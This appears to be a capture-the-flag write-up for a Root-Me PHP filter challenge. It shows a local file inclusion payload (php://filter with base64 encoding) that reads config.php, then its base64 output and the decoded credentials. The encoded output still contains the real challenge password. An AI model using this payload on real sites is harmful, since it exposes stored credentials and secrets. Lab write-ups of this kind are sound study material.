If you click on the login button, you will see that the address contains a variable ?inc=login.php.
(inc like in include)

The title of the challenge invite us to use php filters. After going through the documentation, we use the filters exploit, and enter something like:

```
http://www.root-me.org/challenge/web-serveur/ch12/?inc=php://filter/read=convert.base64-encode/resource=config.php
```

We get the following response, which corresponds to the content of the file **config.php** encrypted in base64.
```
PD9waHAKCiR1c2VybmFtZT0iYWRtaW4iOwokcGFzc3dvcmQ9IkRBUHQ5RDJta3kwQVBBRiI7Cgo/Pg==
```

Just decode this (with whatever you want, I did this with base64.b64decode in Python).

Here is a useful link : https://www.base64decode.org/

You obtain the following result:
```
<?php

$username="admin";
$password="FLAG";

?>
```
